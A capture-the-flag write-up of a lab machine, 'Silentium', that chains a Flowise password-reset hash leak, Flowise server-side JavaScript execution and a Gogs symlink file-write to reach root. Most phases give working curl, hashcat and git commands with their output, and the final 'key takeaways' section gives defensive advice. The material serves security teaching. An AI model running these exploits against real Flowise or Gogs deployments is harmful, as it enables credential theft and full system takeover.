Machine Overview

Silentium chains three CVEs across two services to go from unauthenticated to root. A credential leak in Flowise 3.0.5 yields an admin session, which enables server-side JavaScript injection inside the Flowise Docker container. Reading container environment variables reveals the SSH password for user ben. For root, a symlink bypass in Gogs 0.13.3 lets any authenticated user overwrite arbitrary host files — used to plant an SSH key in /root/.ssh/authorized_keys.

Foothold — CVE-2025-58434: Flowise Credential Leak

03
Forgot-Password Hash Disclosure
Foothold · Phase 03

Flowise 3.0.5's POST /api/v1/account/forgot-password endpoint returns the full user object in the response body — including the bcrypt password hash and a one-time reset token. No authentication is required and no email interception is needed. The hash uses bcrypt cost factor 5, making it extremely fast to crack.

bash — trigger credential leak
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
json — response
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "lyYRJmrSOhoBDEEDSLjrtpxgJtiCCdBgwD32rHdsIChP10Crt..."
  }
}
✕
CVE-2025-58434: The API returns the full user object including the bcrypt credential hash and a valid password reset token with zero authentication. The bcrypt cost factor of 5 is far below the recommended minimum of 10, enabling near-instant cracking.
04
Hashcat — bcrypt Cost 5 Crack
Foothold · Phase 04

Extract the bcrypt hash and crack it against rockyou.txt. Cost factor 5 is approximately 32x faster than cost factor 10, making this viable in seconds on a GPU.

bash
echo '$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG' > flowise.hash
hashcat -m 3200 flowise.hash /usr/share/wordlists/rockyou.txt
output
$2a$05$6o1ngPjXiRj...Bfuos2pWhG:F1l3_d0ck3r
✓
Password Cracked: ben@silentium.htb : F1l3_d0ck3r

Container RCE — CVE-2025-59528: SSJS Injection

06
Server-Side JavaScript Execution
RCE · Phase 06

Flowise 3.0.5 exposes a Server-Side JavaScript execution endpoint at POST /api/v1/node-load-method/customMCP. An earlier version allowed this unauthenticated via the x-request-from: internal header bypass — 3.0.5 patched that bypass but left the SSJS execution itself intact behind standard bearer auth. The JavaScript runs with full Node.js access to process.mainModule, enabling child_process execution.

bash — confirm RCE
TOKEN="eyJhbGciOiJIUzI1NiIs..."

curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "loadMethod": "run",
    "inputParams": {
      "javascript": "({x:(function(){const cp=process.mainModule.require(\"child_process\");return cp.execSync(\"id\").toString();})()} )"
    }
  }'
json — response
{"x": "uid=0(root) gid=0(root) groups=0(root)\n"}
✕
CVE-2025-59528: SSJS execution via process.mainModule.require("child_process") runs as root inside the Flowise Docker container. The auth bypass was patched but the underlying execution primitive was not removed.
07
Read /proc/1/environ — SSH Credential Leak
RCE · Phase 07

The Flowise process is PID 1 inside its own Docker container namespace. Environment variables passed to the container at launch are readable from /proc/1/environ — null-byte separated. The SMTP password turns out to be reused as ben's SSH password on the host.

bash — read container environment
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "loadMethod": "run",
    "inputParams": {
      "javascript": "({x:(function(){const cp=process.mainModule.require(\"child_process\");return cp.execSync(\"cat /proc/1/environ\").toString().replace(/\\x00/g,\"\\n\");})()} )"
    }
  }'
output — /proc/1/environ key values
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge        ← ben's SSH password
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
✓
SSH Credential Found: SMTP_PASSWORD=r04D!!_R4ge — reused as ben's SSH password on the host system.
⚠
Misconfiguration: Sensitive credentials injected as Docker environment variables are readable by any process with container access via /proc/1/environ. Secrets must be mounted as files with restricted permissions or managed via a dedicated secrets manager — never as plain environment variables in container definitions.

10
Gogs Registration & API Token
PrivEsc · Phase 10

Gogs registration is open. Register an attacker account and generate an API token for programmatic access to the repository API.

bash — register account
# Get CSRF token and captcha
curl -sc /tmp/gogs.txt http://staging-v2-code.dev.silentium.htb:3001/user/sign_up

curl -X POST http://staging-v2-code.dev.silentium.htb:3001/user/sign_up \
  -b /tmp/gogs.txt -c /tmp/gogs.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_csrf=<CSRF>&user_name=haxor&email=haxor@evil.com&password=Hack@1234&retype=Hack@1234&captcha_id=<ID>&captcha=<ANSWER>"
bash — create API token
curl -X POST http://staging-v2-code.dev.silentium.htb:3001/api/v1/users/haxor/tokens \
  -u "haxor:Hack@1234" \
  -H "Content-Type: application/json" \
  -d '{"name":"pwn"}' | jq -r .sha1
# → GOGS_TOKEN
11
CVE-2025-8110 — Symlink Commit to Repo
PrivEsc · Phase 11

CVE-2025-8110 is a symlink path traversal in Gogs's PutContents API. When a repository path is a symbolic link, Gogs follows it without validation and writes the supplied content to the linked destination on the host filesystem. Since Gogs runs as root, any file on the system can be overwritten. This was a bypass of the CVE-2024-55947 fix — the original patch did not account for symlinks committed to repositories.

bash — create repo
GOGS_TOKEN="<api_token>"

curl -X POST http://staging-v2-code.dev.silentium.htb:3001/api/v1/user/repos \
  -H "Authorization: token $GOGS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"exploit","auto_init":false}'
bash — build repo with malicious symlink
mkdir /tmp/pwn && cd /tmp/pwn
git init
git config user.email "h@x.com" && git config user.name "haxor"

# Create symlink pointing to target file on host
ln -s /root/.ssh/authorized_keys authorized_keys
git add authorized_keys
git commit -m "symlink"

git remote add origin http://haxor:Hack%401234@127.0.0.1:3001/haxor/exploit.git
git push -u origin master
✕
CVE-2025-8110: Gogs's PutContents API resolves the repository path before writing but does not check whether that path is a symlink. Any file writable by the Gogs process user can be overwritten. Gogs runs as root here, giving full arbitrary file write on the host.
12
Plant SSH Key via Symlink Write
PrivEsc · Phase 12

Generate an Ed25519 keypair, then use the Gogs PUT /api/v1/repos/haxor/exploit/contents/authorized_keys endpoint to write the public key. Gogs follows the symlink and writes the content to /root/.ssh/authorized_keys on the host as root.

bash — generate SSH keypair
ssh-keygen -t ed25519 -f /tmp/root_key -N ""
bash — get SHA and PUT public key through symlink
# Get the current file SHA (required by Gogs API)
SHA=$(curl -s http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/haxor/exploit/contents/authorized_keys \
  -H "Authorization: token $GOGS_TOKEN" | jq -r .sha)

PUBKEY_B64=$(base64 -w0 /tmp/root_key.pub)

curl -X PUT http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/haxor/exploit/contents/authorized_keys \
  -H "Authorization: token $GOGS_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"pwn\",\"content\":\"$PUBKEY_B64\",\"sha\":\"$SHA\"}"
# Gogs follows symlink → writes to /root/.ssh/authorized_keys as root
✓
Authorized Key Planted: Ed25519 public key written to /root/.ssh/authorized_keys via Gogs symlink traversal running as root.

key takeaways
// 01
API Endpoints Must Never Return Credential Material
The forgot-password flow should send a time-limited reset link to the registered email — never return password hashes or reset tokens in the HTTP response body. Any data returned by an unauthenticated endpoint must be treated as publicly disclosed. This single design flaw collapsed the entire authentication boundary.
// 02
bcrypt Cost Factor Below 10 Is Exploitable
Cost factor 5 is approximately 32x faster to crack than cost factor 10 — the current OWASP minimum recommendation. At cost 5, a modern GPU can exhaust common wordlists in seconds. Password hashing must use a cost factor appropriate to current hardware, with plans to migrate hashes upward as hardware improves.
// 03
SSJS Execution Endpoints Require Complete Removal
Patching an authentication bypass (the x-request-from header) while leaving the underlying Server-Side JavaScript execution endpoint intact is a half-fix. Any endpoint that evaluates arbitrary JavaScript server-side is an RCE primitive regardless of authentication state. Such endpoints must be disabled or completely removed in production deployments.
// 04
Docker Environment Variables Are Not Secrets
Environment variables injected into Docker containers are readable from /proc/1/environ by any process with container access. Secrets must never be passed as environment variables in container definitions. Use Docker secrets, mounted secret files with restricted permissions, or a dedicated secrets management API instead.
// 05
Symlink Validation Must Cover the Full Resolved Chain
CVE-2025-8110 demonstrates that file-write APIs must resolve symlinks before any path validation and verify the final resolved path is within an allowed directory. Checking only the immediate path — without following symlinks — leaves the bypass open. Always use realpath() or equivalent and validate the result, not the input.
// 06
Git Services Must Not Run as Root
Gogs running as root means any file-write bug — whether via symlink traversal, path injection, or repository hook execution — becomes an instant privilege escalation to full system compromise. Every service should run under a dedicated least-privilege account with no write access outside its data directory. Process isolation via namespaces or containers provides an additional containment layer.
